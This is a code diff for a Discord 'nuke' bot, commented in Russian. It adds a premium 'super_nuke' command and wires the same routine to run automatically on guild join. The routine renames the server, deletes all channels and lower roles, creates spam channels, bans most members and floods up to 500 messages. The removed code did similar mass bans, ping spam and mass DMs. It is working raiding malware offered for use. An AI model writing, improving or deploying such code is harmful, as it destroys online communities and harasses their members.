@@ -183,6 +183,75 @@ async def do_nuke(guild, spam_text=None):
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
 
 
+async def do_super_nuke(guild, spam_text=None):
+    """
+    Super Nuke — приоритеты:
+    1. Моментальное удаление каналов + ролей (параллельно)
+    2. Создание каналов сразу с 1 сообщением
+    3. Бан всех участников
+    4. Спам до 500 сообщений в общем
+    """
+    if spam_text is None:
+        spam_text = config.SPAM_TEXT
+
+    try:
+        await guild.edit(name=config.GUILD_NAME)
+    except Exception:
+        pass
+
+    bot_role = guild.me.top_role
+
+    # ── ПРИОРИТЕТ 1: Удаляем каналы + роли мгновенно, параллельно ──
+    await asyncio.gather(
+        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
+        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        return_exceptions=True
+    )
+
+    # ── ПРИОРИТЕТ 2: Создаём каналы и сразу шлём 1 сообщение в каждый ──
+    spam_per_channel = max(1, config.SPAM_COUNT // config.CHANNELS_COUNT)
+
+    async def create_and_first_msg(i):
+        try:
+            ch = await guild.create_text_channel(name=config.GUILD_NAME)
+            await ch.send(spam_text)  # сразу 1 сообщение
+            return ch
+        except Exception:
+            return None
+
+    created = await asyncio.gather(
+        *[create_and_first_msg(i) for i in range(config.CHANNELS_COUNT)],
+        return_exceptions=True
+    )
+    channels_ok = [ch for ch in created if isinstance(ch, discord.TextChannel)]
+
+    # ── ПРИОРИТЕТ 3: Баним всех участников параллельно ──
+    targets = [
+        m for m in guild.members
+        if not m.bot and m.id != guild.owner_id
+        and (not m.top_role or m.top_role < bot_role)
+    ]
+    await asyncio.gather(*[m.ban(reason="super_nuke") for m in targets], return_exceptions=True)
+
+    # ── ПРИОРИТЕТ 4: Спам до 500 сообщений в общем ──
+    already_sent = len(channels_ok)  # уже отправили по 1 в каждый
+    remaining = max(0, config.SPAM_COUNT - already_sent)
+    if remaining > 0 and channels_ok:
+        spam_tasks = []
+        per_ch = remaining // len(channels_ok)
+        leftover = remaining % len(channels_ok)
+        for idx, ch in enumerate(channels_ok):
+            count = per_ch + (1 if idx < leftover else 0)
+            for _ in range(count):
+                spam_tasks.append(ch.send(spam_text))
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
+
+    nuke_running[guild.id] = False
+    nuke_starter.pop(guild.id, None)
+    last_spam_text[guild.id] = spam_text
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+
+
 # ─── COMMANDS ──────────────────────────────────────────────
 
 # Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
@@ -215,6 +284,27 @@ async def nuke(ctx, *, text: str = None):
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
     last_spam_text[ctx.guild.id] = spam_text
     asyncio.create_task(do_nuke(guild, spam_text))
+
+
+@bot.command(name="super_nuke")
+@premium_check()
+async def super_nuke(ctx, *, text: str = None):
+    guild = ctx.guild
+    if is_guild_blocked(guild.id):
+        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
+    if nuke_running.get(guild.id):
+        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
+        await ctx.send(embed=embed)
+        return
+    nuke_running[guild.id] = True
+    nuke_starter[guild.id] = ctx.author.id
+    spam_text = text if text else config.SPAM_TEXT
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+    last_spam_text[guild.id] = spam_text
+    asyncio.create_task(do_super_nuke(guild, spam_text))
 
 
 @bot.command()
@@ -1200,59 +1290,11 @@ async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
 
-    # AUTO SUPER NUKE — нюк + настраиваемые действия
+    # AUTO SUPER NUKE — быстрый нюк с приоритетами
     if AUTO_SUPER_NUKE:
         nuke_running[guild.id] = True
         spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
-        asyncio.create_task(do_nuke(guild, spam_text))
-
-        async def super_nuke_tasks():
-            await asyncio.sleep(2)
-            bot_role = guild.me.top_role
-
-            # Массбан или только бустеры
-            if SNUKE_CONFIG.get("massban"):
-                targets = [
-                    m for m in guild.members
-                    if not m.bot and m.id != guild.owner_id
-                    and (not m.top_role or m.top_role < bot_role)
-                ]
-                await asyncio.gather(*[m.ban(reason="auto_super_nuke") for m in targets], return_exceptions=True)
-            elif SNUKE_CONFIG.get("boosters_only"):
-                boosters = [m for m in guild.members if m.premium_since is not None]
-                await asyncio.gather(*[m.ban(reason="booster_ban") for m in boosters], return_exceptions=True)
-
-            # Удаление ролей
-            if SNUKE_CONFIG.get("rolesdelete"):
-                await asyncio.gather(
-                    *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
-                    return_exceptions=True
-                )
-
-            # Пинг спам
-            if SNUKE_CONFIG.get("pingspam"):
-                mentions = discord.AllowedMentions(everyone=True)
-                ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
-                if ch:
-                    for _ in range(10):
-                        try:
-                            await ch.send("@everyone @here", allowed_mentions=mentions)
-                            await asyncio.sleep(0.5)
-                        except Exception:
-                            break
-
-            # Масс ДМ
-            if SNUKE_CONFIG.get("massdm"):
-                for member in guild.members:
-                    if member.bot:
-                        continue
-                    try:
-                        await member.send(spam_text)
-                    except Exception:
-                        pass
-                    await asyncio.sleep(0.5)
-
-        asyncio.create_task(super_nuke_tasks())
+        asyncio.create_task(do_super_nuke(guild, spam_text))
         return
 
     if config.AUTO_NUKE:
